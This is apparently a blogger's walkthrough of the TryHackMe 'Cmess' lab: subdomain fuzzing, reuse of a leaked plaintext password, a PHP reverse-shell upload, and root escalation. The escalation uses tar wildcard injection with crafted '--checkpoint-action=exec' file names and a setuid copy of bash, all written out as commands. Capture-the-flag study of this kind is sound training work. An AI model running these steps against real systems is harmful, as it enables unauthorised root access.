### THM Cmess

Welcome back.  It's getting crunch time so I'm skipping the nmap inclusion here.  Basically we have port 80 and 22.  HTTP and SSH.  HTTP is the likely way in.  When we look at the website itself, there isn't much.  There's no where to create an account.  I was able to find a login but it requires a email.

The trick to this one, is the subdomain.  You need to update your hosts file (and I had to update my `/etc/nsswitch.conf` file).

```
(kali@kali)-$ wfuzz -c -f sub-fighter -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://cmess.thm' -H "Host: FUZZ.cmess.thm"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000003:   400        12 L     53 W       422 Ch      "# Copyright 2007 James Fisher"                                 
000000011:   400        12 L     53 W       422 Ch      "# Priority ordered case-sensitive list, where entries were foun
                                                        d"                                                              
000000010:   400        12 L     53 W       422 Ch      "#"                                                             
000000008:   400        12 L     53 W       422 Ch      "# or send a letter to Creative Commons, 171 Second Street,"    
000000013:   400        12 L     53 W       422 Ch      "#"                                                             
000000007:   400        12 L     53 W       422 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/
                                                        "                                                               
000000001:   400        12 L     53 W       422 Ch      "# directory-list-2.3-medium.txt"                               
000000006:   400        12 L     53 W       422 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this" 
000000009:   400        12 L     53 W       422 Ch      "# Suite 300, San Francisco, California, 94105, USA."           
000000012:   400        12 L     53 W       422 Ch      "# on at least 2 different hosts"                               
000000005:   400        12 L     53 W       422 Ch      "# This work is licensed under the Creative Commons"            
000000016:   200        107 L    290 W      3886 Ch     "images"                                                        
000000020:   200        107 L    290 W      3883 Ch     "crack"                                                         
000000017:   200        107 L    290 W      3892 Ch     "download"                                                      
000000002:   400        12 L     53 W       422 Ch      "#"                                                             
000000004:   400        12 L     53 W       422 Ch      "#"                                                             
000000019:   200        107 L    290 W      3880 Ch     "news"                                                          
000000015:   200        107 L    290 W      3883 Ch     "index"                                                         
000000018:   200        107 L    290 W      3880 Ch     "2006"                                                          
000000014:   200        107 L    290 W      3868 Ch     "http://cmess.thm/"                                             
000000021:   200        107 L    290 W      3886 Ch     "serial"                                                        
000000023:   200        107 L    290 W      3880 Ch     "full"                                                          
000000027:   200        107 L    290 W      3886 Ch     "search"                                                        
000000069:   200        107 L    290 W      3895 Ch     "downloads"
```

That spit out a lot of stuff.  Let's filter some of that down, yea?

```
(kali@kali)-$ wfuzz -c -f sub-fighter -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://cmess.thm' -H "Host: FUZZ.cmess.thm" --hw 290
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000012:   400        12 L     53 W       422 Ch      "# on at least 2 different hosts"                               
000000009:   400        12 L     53 W       422 Ch      "# Suite 300, San Francisco, California, 94105, USA."           
000000011:   400        12 L     53 W       422 Ch      "# Priority ordered case-sensitive list, where entries were foun
                                                        d"                                                              
000000010:   400        12 L     53 W       422 Ch      "#"                                                             
000000013:   400        12 L     53 W       422 Ch      "#"                                                             
000000001:   400        12 L     53 W       422 Ch      "# directory-list-2.3-medium.txt"                               
000000007:   400        12 L     53 W       422 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/
                                                        "                                                               
000000006:   400        12 L     53 W       422 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this" 
000000003:   400        12 L     53 W       422 Ch      "# Copyright 2007 James Fisher"                                 
000000008:   400        12 L     53 W       422 Ch      "# or send a letter to Creative Commons, 171 Second Street,"    
000000005:   400        12 L     53 W       422 Ch      "# This work is licensed under the Creative Commons"            
000000004:   400        12 L     53 W       422 Ch      "#"                                                             
000000002:   400        12 L     53 W       422 Ch      "#"                                                             
000000834:   200        30 L     104 W      934 Ch      "dev"
```

So adding the `--hw 290` to the end cut out all the responses that were coming 404 on the site cause every response would get that.

I stopped it on dev cause that's the one we're interested in.  But when we go to the browser and try to go to that page, it doesn't work.  We have to add `dev.cmess.thm` in order for it to work.  So do that, and refresh the page.  And we have what looks to be a message or chat log where someone asks for the password to be reset and we have it.  In plain text.

Take that password and try ssh.  And bin....no?  Doesn't work.  But, in that chat log, we did get some email addresses.  There was a login page that asked for an email.  And we have a password that goes with that email.  Go to the /admin/ page and the email and password works there.

So now we have an admin portal.  We can look at posts, pages, etc.  We have the site admin, so we can do a lot here.  So much so that I broke the webpage and had to reload the box entirely lol.

So I was able to find a file upload and since I've already got a php shell page built, I just reused that one.  Started up my nc listener and now we're in as `www-data`.

Now that we've got our low level user, time to enumerate and elevate.

![Upload](/Images/THM4Cmess/pic1.png)

Don't forget to go to a writeable folder (here we went to `/tmp/`) so you can write the file to it.

Run our script and there are a couple things to see.  We ran LinEnum.sh this time but I think I would rather run LinPEAS.sh.  That seems to highlight things and points them out better.  But let's look at the output.

![.bak](/Images/THM4Cmess/pic2.png)

Here we appear to have a password backup file.  But there's also another finding.

![Crontab](/Images/THM4Cmess/pic3.png)

In the cron jobs, looks like we have a job that's running as root, in andre's folder.  We just need to get access to andre's profile.

Going back to what we found the first time, the bak file that's readable by everyone.  And what do we find?

![andre's password](/Images/THM4Cmess/pic4.png)

So we can take that and give that ssh thing a try again.

```
(kali@cd bakali)-$ ssh andre@10.10.2.194                                 
The authenticity of host '10.10.2.194 (10.10.2.194)' can't be established.
ED25519 key fingerprint is SHA256:hepiJY+DGs/ds1l4tweTdzOAbt+HxqpmNs3WyZFb4eQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:18: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.2.194' (ED25519) to the list of known hosts.
andre@10.10.2.194's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Feb 13 15:02:43 2020 from 10.0.0.20
andre@cmess:~$ 
```

Now that we have the user access, let's relook at that crontab.  

`*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *`

We've got steps for this but make sure that you do those steps into the folder that is being run from, here, `/home/andre/backup`.  And then go through the steps we had from the lesson.

```
andre@cmess:~/backup$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/runme.sh
andre@cmess:~/backup$ chmod +x runme.sh
andre@cmess:~/backup$ touch /home/andre/backup/--checkpoint=1
andre@cmess:~/backup$ touch /home/andre/backup/--checkpoint-action=exec=sh\ runme.sh
andre@cmess:~/backup$ ls
```

Earlier notes had this 4th line code working with `exec=sh\runme.sh` as opposed to `exec=sh\ runme.sh`.  Both may work but may want to try both.

![Ding](/Images/THM4Cmess/pic5.png)

Give that a minute (or two actually since it did say it runs every 2 minutes).  And then `/tmp/bash -p` and we're in.  Good times.

So this was an interesting one.  Instead of hunting domains and directories, we `wfuzz` for some subdirectories.  The `/etc/hosts` file gave me some fits but got that working after updating a different file (`/etc/nsswitch.conf`).  I doubt that will be a thing outside of labs but maybe.  Something to keep in the back of my mind.

Thanks for coming along. :)

